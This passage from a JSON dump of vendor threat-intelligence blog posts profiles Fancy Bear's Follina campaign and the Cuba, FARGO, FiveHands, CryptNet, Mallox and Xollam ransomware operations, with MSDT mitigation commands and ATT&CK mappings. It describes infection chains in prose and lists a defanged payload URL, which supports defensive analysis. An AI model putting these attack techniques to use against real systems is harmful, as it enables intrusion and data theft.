been done.\nUnless an organization can fully recover its files from backups, there will be some data loss, even if a ransom is paid.\nAdditionally, modern ransomware often steals and sends out data before encrypting it, indicating that the company may have already experienced a data breach.\nThe best way to get ahead of a ransomware attack is to be proactive, utilizing ransomware best practices to protect against the threat: Avertium and the FBI recommend that network defenders apply the following mitigations to reduce the risk of compromise by Cuba ransomware: IP Addresses Bitcoin Wallets Email Addresses SHA256 - File Hashes MD5 – Hashes Related Resource: Ukraine Warns of Cuba Ransomware Attacks - Infosecurity Magazine (infosecurity-magazine.com) Microsoft Word - Cuba Ransomware FLASH NOV11292021(1) (ic3.gov) FBI: Cuba ransomware raked in $60 million from over 100 victims (bleepingcomputer.com) Novel News on Cuba Ransomware: Greetings From Tropical Scorpius (paloaltonetworks.com) Unit 42 (paloaltonetworks.com) Chile and Montenegro Floored by Ransomware - Infosecurity Magazine (infosecurity-magazine.com) Microsoft: Cuba ransomware hacking Exchange servers via OWASSRF flaw (bleepingcomputer.com) Philadelphia Inquirer is Struck by Cuba Ransomware – Blogs (gridinsoft.com) Novel News on Cuba Ransomware: Greetings From Tropical Scorpius (paloaltonetworks.com) Philly Inquirer disputes Cuba ransomware gang's leak claims • The Register FBI Warns of Cuba Ransomware Attacks on Critical Infrastructure - SecurityWeek Cuba Ransomware Group’s New Variant Found Using Optimized Infection Techniques (trendmicro.com) Signed driver malware moves up the software trust chain – Sophos News Healthcare Sector Warned About Cuba Ransomware Attacks (hipaajournal.com) Cuba ransomware claims cyberattack on Philadelphia Inquirer (bleepingcomputer.com) aa22-335a-stopransomware-cuba-ransomware.pdf (cisa.gov) How Should Companies Handle Ransomware? -\nCheck Point Software Cuba Ransomware Group’s New Variant Found Using Optimized Infection Techniques (trendmicro.com) CISA Alert AA22-335A: Cuba Ransomware Analysis, Simulation, TTPs & IOCs (picussecurity.com) FBI: Cuba ransomware breached 49 US critical infrastructure orgs (bleepingcomputer.com) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":73,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"cuba-ransomware"}}
{"id":7,"title":"Everything You Need to Know About the APT, Fancy Bear","publish_date":"2022-07-28","link":"https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-the-apt-fancy-bear","clean_text":"Executive Summary of FANCY BEAR Since 2008, the Russian APT Fancy Bear (also known as APT28), has used fear and social engineering to trick victims into opening malicious email attachments or click on malicious links.\nThey are known for several disruptive cyber attacks that go beyond the United States.\nPreviously known for their low-key intelligence gathering, Fancy Bear made headlines in 2016 when they sent spear-phishing emails to members of the Democratic National Committee (DNC).\nThe emails tricked victims into changing their email passwords on a fake webmail domain.\nAs a result, credentials were stolen and used to gain access to the DNC network, install malware, and steal data – data that was later leaked online.\nThe 2016 DNC attack took place during the U.S. presidential election and was the start of the threat actor pivoting from being less visible to extremely visible.\nTheir goal appeared to be to unsettle and weaken victim organizations and countries.\nNow, Fancy Bear is back to their old tricks – this time impacting Ukraine.\nLet’s take a look at Fancy Bear’s tactics and techniques, how they’ve victimized Ukrainians, and why zero-day vulnerabilities should be watched even after the hysteria subsides.\nFancy Bear, also known as APT 28, Sofacy, or Swallowtail, is a cyberespionage group that is linked to the Russian government.\nThe group has been in operation since 2008, targeting the energy, government, media, aerospace, and defense sectors via phishing campaigns and credential harvesting.\nFancy Bear is known to target both computers and mobile devices, running multiple intrusion operations concurrently.\nIn 2016, Fancy Bear was front and center after they attacked the Democratic National Committee (DNC).\nThe group was also responsible for leaking confidential drug testing information after they attacked the World Anti-Doping Agency (WADA) during the same year.\nFancy Bear took credit for the attack and leaked the stolen information on a site named “Fancy Bears”.\nDespite two very public attacks, Fancy Bear returned to the shadows in 2017.\nSince that time, the group’s activities have become clandestine, motivated by intelligence gathering.\nBetween 2017 and 2018, Fancy Bear targeted the following organizations: After much attention, Fancy Bear became more discreet, and not much was heard from the APT until their recent attacks on Ukrainians.\nIn July 2022, researchers from Malwarebytes observed malicious activity from the group.\nThey were sending malicious documents that contained an exploit for the Microsoft zero-day, Follina (CVE-2022-30190).\nIf you recall, Avertium’s Cyber Threat Intelligence team issued an emergency Flash Notice for the vulnerability on June 1, 2022.\nThe zero-day is exploited via specially crafted Office documents, even with macros disabled.\nFollina also allows attackers to run malicious code on targeted systems, as well as abuse the remote template feature in Microsoft Word to retrieve a HTML Template from a remote URL.\nThe zero-day was discovered by Nao Sec and the document they observed in the wild used Word’s external link to load the HTML and then used the “ms-msdt” scheme to execute PowerShell code.\nMSDT stands for Microsoft Support Diagnostic Tool, a tool that collects information and sends it to Microsoft Support.\nThe ‘Protected View’ feature in Microsoft Office does prevent exploitation, but if a document is changed to RTF format, it will run without even opening the document.\nThe above technique is known as template injection and if an attacker is successful, they will be able to change view, delete data, install programs, and create new accounts in the context allowed by user’s rights.\nAlthough Microsoft had workarounds for Follina, they did not have a patch.\nFancy Bear was able to exploit the unpatched vulnerability by sending Ukrainian victims phishing emails with a document titled “Nuclear Terrorism A Very Real Threat.rtf”.\nSince the war between Russia and Ukraine began, the people of Ukraine have been fearful that the war may become a nuclear holocaust.\nThe malicious document includes an article from an international affairs group called Atlantic Council.\nThe article speaks of the possibility of Putin using nuclear weapons in the war against Ukraine.\nOnce users open the malicious document, a new version of a .Net credential stealer is loaded onto their systems via Follina.\nFollina steals usernames, passwords, and URLs from Microsoft Edge browsers, as well as Google Chrome browsers.\nAlthough other groups and state-backed threat actors have exploited Follina, this is the first time researchers have observed an APT exploiting the flaw.\nMicrosoft has since released a patch for Follina, but not before other threat actors began exploiting it.\nAnother group tracked as UAC-0098 targeted critical infrastructure in Ukraine with a tax-themed Follina document.\nThe threat actors used Follina to drop the Cobalt Strike Beacon post-compromise attack tool.\nAnother group used Follina to target media organizations in Ukraine.\nIn April 2022, Fancy Bear was one of the five APTs CISA believed to be involved with attacks tied to campaigns designed to damage Ukraine’s digital infrastructure.\nFancy Bear’s tools are constantly in development, and they’ve used a number of tools to compromise their targets.\nThe APT is well-known for registering malicious domains that almost mirror the domains of legitimate businesses and organizations.\nThe spoofed domains are used to target their victims by providing the look and feel of a legitimate site, harvesting credentials once a victim clicks on their link.\nAccording to Symantec, Fancy Bear’s primary malware is Sofacy.\nThe malware has two components: Trojan.\nSofacy and Backdoor.\nSofacyX. Trojan.\nSofacy’s (also known as Seduploader) role is to perform basic reconnaissance on infected computers and download more malware.\nA second stage malware, Backdoor.\nSofacyX’s (also known as X-Agent) job is to steal information from infected computers.\nThere is also a Mac version of the Trojan called OSX.Sofacy.\nFancy Bear has also re-developed tools over the past two years, including re-writing Trojan.\nShunnael to .NET.\nTrojan.\nShunnael is a malware the group uses to maintain access to infected networks using an encrypted tunnel.\nThe APT maintains a persistent presence on compromised machines by using a Unified Extensible Firmware Interface (UEFI) rootkit called Lojax.\nThis rootkit lives within the computer’s flash memory, allowing Fancy Bear to maintain persistence even if the hard drive of a compromised machine is replaced or the operating system is reinstalled.\nAs we stated previously, Fancy Bear uses phishing emails to send a malicious RTF file called “Nuclear Terrorism a Very Real Threat.rtf”.\nThe malicious document is an article that talks about how Putin will use nuclear war weapons in the war against Ukraine.\nFancy Bear uses a remote template embedded into the following file: Document.xml.rels.\nThen a remote HTML file is retrieved from the following URL: http://kitten-268[.]frge[.]io/article[.]HTML.\nAfter retrieval, the HTML file uses a JavaScript call to the following: window.location.href.\nThis then loads and executes the encoded PowerShell script by using ms-msdt MSProtocol URI scheme.\nImage 1: APT28 Cookie Stealer Code Source: Avertium's Cyber Threat Intelligence Team Image 2: APT28 Cookie Stealer Code Source: Avertium's Cyber Threat Intelligence Team Finally, PowerShell loads the final payload, which is a variant of the .Net stealer that was identified by Google in previous campaigns against Ukraine.\nThe .Net stealer’s objective is to steal passwords, usernames, and URLs from browsers.\nImage 3: The Malicious Document Source: MalwareBytes Another group named Earworm has been observed gather intelligence against military targets since May 2016.\nTheir targets include Central Asia, Europe, and Eastern Asia.\nThey too use spear-phishing emails to compromise their targets and infect them with malware.\nThe group uses two tools, Trojan.\nZekapab and Backdoor Zeckapab.\nLike the tools used by Fancy Bear, Trojan.\nZekapab is used to carry out basic reconnaissance, while Backdoor.\nZekapab is used to take screen shots, execute files and commands, upload and download files, and carry out system information tasks.\nOn occasion, the espionage group has installed other tools for keylogging and password capture.\nSymantec observed overlap between the command-and-control infrastructure used by Earworm and the command-and-control infrastructure used by Fancy Bear.\nThe overlap suggests a connection between the two groups.\nHowever, because Earworm’s operations seem separate from Fancy Bear, researchers track Earworm as its own group.\nAccording to Crowdstrike, Fancy Bear mirrors the strategic interests of the Russian government.\nThe group may also be affiliated with Russia’s premier military intelligence service, Main Intelligence Department (also known as GRU).\nZero-day attacks are dangerous, and they target software vulnerabilities that were previously unknown to software vendors.\nThe vulnerabilities are exploited before they can be mitigated, resulting in zero-day attacks entering systems that don’t have defense mechanisms in place.\nThis means that administrators don’t have time (zero days) to fix the security flaw.\nCommon attack vectors for zero-days are web browsers, email attachments, and zero-day malware.\nGenerally, the targets for these kinds of attacks include home internet users, as well as large and small enterprises with valuable data.\nFancy Bear has certainly checked off all of these boxes.\nUnfortunately, zero-day attacks are only detected on the day security flaws are being exploited, making them a technical challenge for cyber security professionals.\nWith zero-days, attackers act quickly, and vulnerabilities are exploited at the last possible minute.\nThis leaves cyber security professionals scrambling to perform code review and sanitize their code.\nZero-day vulnerabilities, like Follina, are often hot topics when the news breaks but later get thrown onto the list of other zero-day vulnerabilities – never to be spoken of again until they’re exploited by threat actors like Fancy Bear.\nIt’s vital for cyber security professionals to actively keep an eye on zero-day vulnerabilities even after the initial excitement of a zero-day dies down.\nLetting down your guard could mean letting an attacker into your system when you don’t have protections in place.\nWhile sometimes, zero-day attacks are inevitable, there are zero-day best practices that your organization can implement consistently.\nEffective Web Application Firewall (WAF) – this is the most powerful way to prevent zero-day attacks.\nWAFs filter malicious traffic and prevent exploitation.\nSanitizing code and patching takes time, but WAFs help you act as quickly as possible by preventing bad traffic from getting into your system in the first place.\nYour organization’s WAF should be able to respond in real-time and adapt to stay current with the latest cyber threats.\nMonitor Inbound and Outbound Traffic – Your organization should pay close attention to your network’s outbound traffic.\nBlocking malicious bot and Trojans on outgoing transfers with the use of firewalls and outgoing proxies can help mitigate zero-day attacks.\nCyber security professionals can determine which inbound and outbound traffic should be permitted by analyzing the router’s activity log.\nSuspicious outbound connections should be blocked on the router.\nMaintain a Clear Incident Response Plan – when dealing with a zero-day, the one thing your organization will not have is time.\nOrganizations should develop a clear and thorough incident response plan ahead of time to quickly minimize damage.\nThis includes: Understanding your company’s IT structure Recognizing your system’s weak points by conducting regular assessments Establishing an emergency response team Creating and clearly outlining a quick response guide Prepare for a disaster recovery scenario Zero-day attacks are scary and powerful, but they are not unstoppable.\nOrganizations should adhere to a holistic cybersecurity strategy, not just patch and forget.\nSocial engineering happens when threat actors like Fancy Bear influence or manipulate victims so they can gain control over their computer system.\nFancy Bear uses social engineering to evoke fear from Ukrainians by sending them an email with a subject related to nuclear terrorism.\nTypically, threat actors who rely on social engineering to victimize organizations and people, will make a convincing phone call, send an “urgent” email with an attachment, or make direct contact to gain access to sensitive information.\nAlthough this report details the Russian APT Fancy Bear and how they use phishing emails to victimize Ukrainians, social engineering is not exclusive and is heavily used by threat actors when attacking organizations.\nIt’s up to organizations to properly train employees on how to spot phishing emails.\nSome of the most obvious indications that you might be a phishing target include: A generic greeting using Sir/Madam or no greeting at all Requiring the user to click on a misleading URL hyperlink An email that contains buttons with hyperlinks to unfamiliar webpages Spelling and grammar mistakes The “From” email address looks suspicious Unsolicited attachments APTs like Fancy Bear use zero-day vulnerabilities in addition to targeted phishing campaigns to entice victims into opening malicious documents.\nPlease don’t let your organization become a victim of a zero-day or a targeted campaign by not implementing zero-day best practices.\nIn addition to practicing good cyber security hygiene, you can count on Avertium to provide the best services to help keep your organization safe.\nFusion MXDR is the first MDR offering that fuses together all aspects of security operations into a living, breathing, threat-resistant XDR solution.\nBy fusing insights from threat intelligence, security assessments, and vulnerability management into our MDR approach, Fusion MXDR offers a more informed, robust, and cost-effective approach to cybersecurity – one that is great than the sum of its parts.\nAvertium offers Zero Trust Architecture, like AppGate, to stop malware lateral movement.\nAvertium offers Zero Trust Network as a Service (ZTNaaS) for any organization that wants to control their attack surface.\nThe zero-trust security model delivers exactly what the name promises: it's an IT security concept that specifies no access is allowed until the successful completion of authentication and authorization processes.\nAvertium offers user awareness training through KnowBe4.\nThe service also Incident Response Table-Top exercises (IR TTX) and Core Security Document development, as well as a comprehensive new-school approach that integrates baseline testing using mock attacks.\nDisable the MSDT URL Protocol to prevent troubleshooters from being launched as links.\nRun Command Prompt as Administrator.\nTo back up the registry key, execute the command “reg export HKEY_CLASSES_ROOT\\ms-msdt filename“.\nExecute the command “reg delete HKEY_CLASSES_ROOT\\ms-msdt /f”.\nDisable Troubleshooting Wizards completely via GPO.\nRun this command: reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics /f /v EnableDiagnostics /d 0 , with an admin prompt to set the Enable Diagnostics key to 0, disabling Microsoft Troubleshooter.\nFor those with MS Defender Anti-Virus they should turn on cloud-delivered protection and automatic sample submission.\nFor those with Microsoft Defender for Endpoint enable the attack surface reduction rule “BlockOfficeCreateProcessRule” that blocks Office apps from creating child processes.\nCreating malicious child processes is a common malware strategy.\nThe following alert title in the Microsoft 365 Defender portal can indicate threat activity on your network: Suspicious behavior by an Office application Suspicious behavior by Msdt.exe | Reconnaissance | Initial Access | Execution | Defense Evasion | Discovery | Command and Control | Exfiltration | | T1598: Phishing for Information | T1566.001: Phishing: Spearphishing Attachment | T1059.001: Command and Scripting Interpreter: PowerShell T1203: Exploitation for Client Execution | T1140: Deobfuscate/Decode Files or Information | T1135: Network Share Discovery T1124: System Time Discovery | T1105: Ingress Tool Transfer | T1041: Exfiltration Over C2 Channel | Trojan.\nSofacy (Seduploader) Backdoor.\nSofacy (X-Agent) Trojan.\nShunael (X-Agent) Follina Detect the Follina MSDT Vulnerability (CVE-2022-30190) with Qualys Multi-Vector EDR & Context XDR | Qualys Security Blog This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":136,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"fancy-bear"}}
{"id":8,"title":"Flash Notice: FARGO Ransomware Attacking Microsoft SQL Servers","publish_date":"2022-02-28","link":"https://www.avertium.com/flash-notices/fargo-ransomware-attacking-microsoft-sql-servers","clean_text":"Vulnerable Microsoft SQL servers are currently being targeted by threat actors and infected with FARGO ransomware (also known as Mallox and TargetCompany).\nMicrosoft’s SQL servers hold data for internet services and apps.\nA disruption to these databases by FARGO could cause severe issues for businesses.\nIn February 2022, the threat actors behind FARGO attacks dropped Cobalt Strike beacons, and by July 2022, they were hijacking vulnerable Microsoft SQL servers to steal bandwidth for their own proxy services.\nThe latest FARGO attacks blackmail database owners into paying the demanded ransom.\nIf the owners refuse to pay the ransom, the threat actors threaten to expose their stolen files on Telegram.\nFARGO is one of the most popular ransomware strains that focuses on Microsoft SQL servers.\nThe ransomware infection starts by using powershell.exe and cmd.exe to download a .NET file to a compromised machine.\nAfter the payload fetches additional malware, a .BAT file terminates certain processes and services.\nTo ensure that businesses can’t recover their data, FARGO executes the recovery deactivation command and kills processes prior to initiating encryption.\nOnce encryption is complete, FARGO renames locked files using the “.Fargo3” extension and generates a ransom note titled “RECOVERY FILES.txt.”\nThe threat actors expect the demanded ransom to be paid in Bitcoin.\nDatabase servers are often compromised via brute-force, and if a threat actor is able to use brute-force in their attack, it’s likely due to their target having weak credentials.\nThe threat actor may also try to attack a database server by exploiting well-known and unpatched vulnerabilities.\nIt’s important that organizations keep their devices updated with the latest security patches and maintain strong passwords.\nINDICATOR'S OF COMPROMISE (IOCS): MD5 Hashes Downloader SHA-1 SHA-256 Vhash Imphash FARGO Ransomware Targets Vulnerable Microsoft SQL Servers (socradar.io) Microsoft SQL servers hacked in TargetCompany ransomware attacks (bleepingcomputer.com) Microsoft SQL servers subjected to new FARGO ransomware attacks | SC Media (scmagazine.com) FARGO ransomware targets vulnerable Microsoft SQL servers in new wave of attacks | IT PRO Related Reading: CaddyWiper Malware vs. RURansom Wiper (The Cyber War Continues) Contact us for more information about Avertium’s managed security service capabilities.","num_sentences":16,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"fargo"}}
{"id":9,"title":"FiveHands Ransomware Overview","publish_date":null,"link":"https://www.avertium.com/blog/fivehands-ransomware-overview","clean_text":"This report is an overview of the FiveHands Ransomware variant that successfully attacked an organization (CISA release date May 6, 2021).\nCISA reports that the variant used publicly-available pen test and exploitation tools—plus FiveHands ransomware and SombRAT remote access trojan (RAT)—to steal information, obfuscate files, accomplish network discovery, accomplish credential access, and demand ransom from the victim.\nTools used include SoftPerfect Network Scanner, FiveHands ransomware, PsExec.exe, ServeManager.exe, SombRAT, RouterScan.exe, grabff.exe, rclone.exe, and s3browser-9-5-3.exe.\nThe initial access vector was a zero-day vulnerability in a VPN product.\nWhat followed is that the bad actor used SoftPerfect Network Scanner for the discovery of hostnames and network services.\nPsExec was then used to execute ServeManager.exe (what CISA calls FiveHands ransomware): “FiveHands is a novel ransomware variant that uses a public key encryption scheme called NTRUEncrypt.\nNote: the NTRUEncrypt public key cryptosystem encryption algorithm (NTRU), is a lattice-based alternative to Rivest-Shamir-Adleman, known as RSA, and Elliptic-curve cryptography, or ECC, and is based on the shortest vector problem in a lattice.\nTo prevent data recovery, FiveHands uses WMI to first enumerate then delete Volume Shadow copies (Inhibit System Recovery [T1490]; Windows Management Instrumentation [T1047]).\nThe malware also encrypts files in the recovery folder (Data Encrypted for Impact [T1486]).\nAfter the files are encrypted, the program will write a ransom note to each folder and directory on the system.” (\nhttps://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a) MITRE also points to PowerSploit—an offensive, open-source security framework combining PowerShell modules and scripts to perform tasks related to pen-testing (e.g., RCE, persistence, bypassing AV, recon, and exfiltration).\nTechniques that may be used include—but are not limited to—Access Token Manipulation, Boot or Logon Autostart, Command and Scripting Interpreter (PowerShell), Domain Trust Discovery, Process Discovery, Screen Capture, and Kerberoasting (for the full list, refer to the MITRE Mapping link in the Sources section below).\nNote: The Avertium Threat Report analyzes one current threat that has been shared by threat intelligence networks across the globe.\nUsed internally by the Avertium CyberOps Team, this report will outline a “top-of-mind” threat and how it ought to be addressed accordingly.\nThis informed analysis is based on the latest data available.","num_sentences":15,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"fivehands"}}
{"id":10,"title":"New Ransomware Strains - CryptNet, Mallox, and Xollam","publish_date":"2023-07-28","link":"https://www.avertium.com/resources/threat-reports/new-ransomware-strains-cryptnet-mallox-and-xollam","clean_text":"Although ransomware appeared to decline towards the end of 2022, there seemed to be an uptick in ransomware attacks during the second quarter of 2023.\nResearch from SonicWall showed a 74% increase in ransomware attacks compared to the first three months of the year.\nAccording to findings by SonicWall Capture Labs Threat Researchers, the first quarter of 2023 witnessed a relatively low number of ransomware attacks, totaling 51.2 million incidents.\nThis marked the lowest figure recorded since the fourth quarter of 2019.\nIn contrast, the second quarter of 2023 experienced a resurgence in ransomware activity, with a substantial increase of 74%, totaling 88.9 million attacks.\nNonetheless, the upswing in ransomware attacks observed throughout April, May, and June of 2023 suggests a potential resurgence in attacker activity.\nThe report highlighted this concern, stating, \"When considering the monthly patterns, it becomes apparent that ransomware may resurge as we progress through 2023.\"\nIn July 2023, Chainalysis found that in the first half of 2023, ransomware attackers made $176 million more than they did during the same period in 2022.\nThis is a reversal of the trend we saw in 2022 when ransomware attacks were decreasing.\nNow, there are new ransomware strains contributing to the rise of ransomware attacks.\nCryptNet, Mallox, and Xollam are new strains with operators that have intensified the way they attack, posing new challengers for cybersecurity professionals.\nLet’s dive into the details of these ransomware strains and explore measures organizations can take to protect themselves.\nIn May 2023, the threat researchers at ZScaler published technical details about the ransomware strain, CryptNet.\nThe strain emerged in April 2023 and the operators claim to exfiltrate data prior to performing file encryption.\nAccording to ZScaler, CryptNet has a data leak site that lists two victims from April 2023.\nCryptNet appears to be a ransomware-as-a-service (RaaS) operation – recruiting affiliates via criminal forums. [\n1]Surprisingly, affiliates have the chance of a 90% cut, which is a big jump from the 60-80% share most groups offer.\nCryptNet’s attack region is worldwide, and targeted industries include trading companies and distributors, as well as internet software and services.\nCryptNet promotes itself as high-speed, completely undetectable ransomware, claiming to have the ability to delete shadow copies, perform offline encryption, and disable backup services.\nThe ransomware operators also have a chat panel for ransom negotiations.\nZScaler’s research states that CryptNet uses code that is written in .NET and obfuscated using .Net Reactor.\nUpon removing the obfuscation layer, it becomes clear that CryptNet bears striking similarities to the Chaos ransomware family, particularly its latest variant, Yashma.\nThese similarities include encryption techniques, the ability to disable backup services, and the deletion of shadow copies, as mentioned above.\nCryptNet seems to have enhanced the Yashma code, resulting in better file encryption performance.\nImage 1: String Decryption Algorithm Source: ZScaler [1] CryptNet: Russian ransom gang makes its debut | Cybernews Despite the researchers successfully removing the obfuscation layer, they encountered a situation where the vital information within the ransomware code remained concealed within a resource section.\nThis section was further protected through encryption using a customized algorithm.\nOnce decrypted, the strings appear to be stored in sequence, with each string preceded by a DWORD value indicating its size.\nOne of the initial steps carried out by the ransomware involves creating a decryption ID, which is later included in the ransom note.\nOnce CryptNet creates the victim ID, it begins the main encryption process.\nThe ransomware excludes the following directories from encryption: The following file names are also excluded from encryption: Here is a sample of file extensions (that have a matching file) CryptNet will encrypt: The ransom note that CryptNet drops during the encryption process is named RESTORE-FILES-[9 random chars] .\ntxt.\nSee the note below.\nImage 2: CryptNet Ransom Note Source: ZScaler Furthermore, when the ransomware is executed with administrator privileges, CryptNet will stop a list of services.\nIt also removes Window shadow copies before deleting the backup catalog if the ransomware has administrator privileges.\nOnce a victim enters the Tor site mentioned in the ransom note, a login screen asks them to enter a decryption ID and solve a captcha.\nNext, a timer is displayed with the option to test file decryption.\nThere is also a chat feature to negotiate ransom payments.\nThe chat feature also provides a link to CryptNet’s data leak site.\nAlthough CryptNet does use the same codebase as the Yashma and Chaos ransomware families, CryptNet lacks some of Yashma’s features which include lack of persistence and language/country restrictions.\nIt’s clear that CryptNet has taken the codebase of Yashma and Chaos and increased the file encryption efficiency.\nMallox ransomware specifically targets computers running Microsoft Windows.\nThis ransomware was first observed in June 2021 and is known for exploiting unsecured MS-SQL servers as a penetration vector to compromise victims’ networks.\nThe ransomware’s targeted industries are manufacturing, professional and legal services, and wholesale and retail.\nThe ransomware operators claim that their victims include worldwide organizations.\nAccording to Lior Rochberger, a senior security researcher at Palo Alto Networks, Mallox’s sudden increase in activity is attributed to the deliberate actions taken by the group's leaders to expand Mallox's operations.\nRochberger stated that group appeared to focus more on recruiting affiliates at the beginning of 2023.\nThis shift in strategy explains the significant increase observed this year.\nRecently, researchers from Unit 42 have noticed a significant increase in Mallox ransomware activity, with a surge of almost 174% compared to 2022.\nThis increase is primarily due to Mallox using vulnerable MS-SQL (CVE-2020-0618 and CVE-2019-1068) servers to spread the ransomware.\nUnit 42 also observed Mallox using tactics such as brute force, data exfiltration, and the use of network scanning tools.\nResearchers have also reported that the group has attempted to distribute Mallox via phishing emails – suggesting affiliates may be involved.\nOnce the threat actors gain access, they use the command line and PowerShell to download the Mallox ransomware payload from a remote server.\nLike other ransomware groups, the initial payload tries to deactivate any services that might hinder data encryption on the targeted system.\nAlso, it tries to erase shadow copies, making data recovery more challenging after encryption.\nThe malware also attempts to eliminate all event logs, utilizing a commonly used Microsoft command utility to try and complicate forensic analysis.\nLike CryptNet, the threat actors behind Mallox use the double extortion method – stealing data before encrypting it.\nThey also have a data leak site where they leak the data of victims that refuse to pay or negotiate its ransom demands.\nVictims negotiate with the threat actors by using a private key to authenticate themselves.\nAs previously stated, the ransomware operators claim to have breached hundreds of organizations worldwide.\nUnit 42 stated that their telemetry indicates at least dozens of potential Mallox victims.\nIn 2022, Mallox ransomware was discovered to be a variant of the TargetCompany ransomware strain.\nResearchers believe that Xollam is also a variant of the TargetCompany ransomware strain due to the operators using similar techniques.\nAccording to TrendMicro, in 2023, Xollam was seen using phishing campaigns and Microsoft OneNote files to access and distribute malware - a departure from the TargetCompany and Mallox’s previous focus on exploiting vulnerable MS SQL databases.\nAccording to Trend Micro’s investigation, Xollam employs a pseudo-fileless technique using PowerShell.\nThis involves the execution of reflective loading to download its payload.\nTrend Micro also observed the technique in earlier variants of the TargetCompany ransomware.\nThe latest version of the ransomware, Xollam, was found in February of this year.\nIn that same month, the older version of Mallox was also active and was responsible for an attack on the Federation of Indian Chambers of Commerce and Industry (FICCI).\nThe TargetCompany is known to be a small and closed group.\nIt’s clear that the operation is now exploring new methods and expanding its reach by participating in OneNote phishing campaigns.\nThis shift allows the TargetCompany to target a broader range of potential victims, leading to higher profits.\nIn just two years of operation, the cybercriminals behind the ransomware have extended their operations by introducing a RaaS affiliate program and maintaining multiple channels to publicize victims and publish stolen data.\nRansomware operations are constantly evolving and adapting their tactics.\nCryptNet, for instance, evolved from Yashma and streamlined its code for better performance.\nMallox shifted from primarily targeting MS SQL databases to using phishing campaigns with OneNote files, showing the desire to diversify their victim base.\nThe evolving tactics, increased modification, and persistence of ransomware groups/strains underscore the ongoing need for robust cybersecurity measures, timely patching, and user education to protect against ransomware threats.\nBest practices when that can help protect organizations from ransomware operations like Mallox, Xollam, The TargetCompany, and CryptNet.\nCVE-2020-0618 CVE-2019-1068 The TargetCompany/Mallox/Xollam CryptNet CryptNet Mallox The TargetCompany Mid-Year Update to the 2023 SonicWall Cyber Threat Report | Threat Intelligence Ransomware Attacks Skyrocket in Q2 2023 - Infosecurity Magazine (infosecurity-magazine.com) Mallox Ransomware Group Escalates Cyber Threat with Enhanced Evasion Tactics (speartip.com) CryptNet: Russian ransom gang makes its debut | Cybernews Mallox Ransomware Exploits Weak MS-SQL Servers to Breach Networks (thehackernews.com) Technical Analysis of CryptNet Ransomware - Security Boulevard KB4535305 - SQL Server Reporting Services remote code execution vulnerability - Microsoft Support New CryptNet Ransomware-as-a-Service Announced on RAMP | ZeroFox Mid-Year Update: 2023 SonicWall Cyber Threat Report PowerPoint Presentation (hivepro.com) Threat Group Assessment: Mallox Ransomware (paloaltonetworks.com) Xollam the Latest Face of TargetCompany (trendmicro.com) Mallox Ransomware Group Activity Shifts Into High Gear (darkreading.com) Ransomware Spotlight: TargetCompany - Security News (trendmicro.com) documents.trendmicro.com/assets/txt/ransomware-spotlight-TargetCompany-terminated-IOCs-rwdW7GY.txt This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.","num_sentences":81,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"mallox"}}
{"id":11,"title":"An In-Depth Look at Iranian APT \"MuddyWater\"","publish_date":"2022-02-28","link":"https://www.avertium.com/resources/threat-reports/in-depth-iranian-apt-muddywater","clean_text":"Executive Summary In February 2022, CISA, the Federal Bureau of Investigation (FBI), the U.S. Cyber Command Cyber National Mission Force (CNMF), the United Kingdom’s National Cyber Security Centre (NCSC-UK), and the National Security Agency (NSA) released a joint statement regarding their observation of Iranian government-sponsored APT MuddyWater and their malicious cyber activity.\nMuddyWater is known for cyber espionage, as well as other cybercriminal operations as part of Iran’s Ministry of Intelligence and Security.\nThe threat actors have targeted several government and private sector organizations in the defense, oil and natural gas, local government, and telecommunications industries – focusing on Asia, Africa, Europe, and North America.\nMuddyWater conducts broad cyber campaigns, exploiting publicly reported vulnerabilities and using open-source tools and strategies to gain access to their target’s systems.\nLet’s take a look at MuddyWater, their tactics, and their techniques, as well as the current state of cyber espionage.\nAlso, known as MERCURY, Earth Vetala, Static Kitten, Seedworm, and TEMP.Zagros, MuddyWater is an Iranian APT and a subservient element within the Iranian Ministry of Intelligence and Security (MOIS).\nThe group has been active since 2018 and has provided stolen data and access to the Iranian government by exploiting known vulnerabilities and using open-source tools to deploy their ransomware.\nIn November 2021, Cisco Talos observed a campaign targeting Turkey government entities, including the Scientific and Technological Research Council of Turkey – Tubitak.\nMuddyWater has three goals when conducting their attacks: cyber espionage, intellectual property theft, and ransomware attacks.\nMuddyWater uses several malware variants such as PowGoop, Canopy, Small Sieve, POWERSTATS, and Mori.\nMuddyWater also uses malicious documents to deploy Remote Access Trojans (RATs) on vulnerable systems.\nAccording to Cisco Talos, MuddyWater plants a malicious macro in their documents that, once triggered, drops two WSF files on the endpoint.\nAdditionally, MuddyWater uses DNS to contact the command and control (C2), while original contact with hosting servers is done via HTTP.\nPowerShell and Visual Basic scripting are used for their initial payload, in addition to LoLBins to assist in the initial stages of infection.\nAs we previously stated, MuddyWater was seen targeting Turkish government entities in November 2021.\nCisco Talos observed that the campaign included malicious 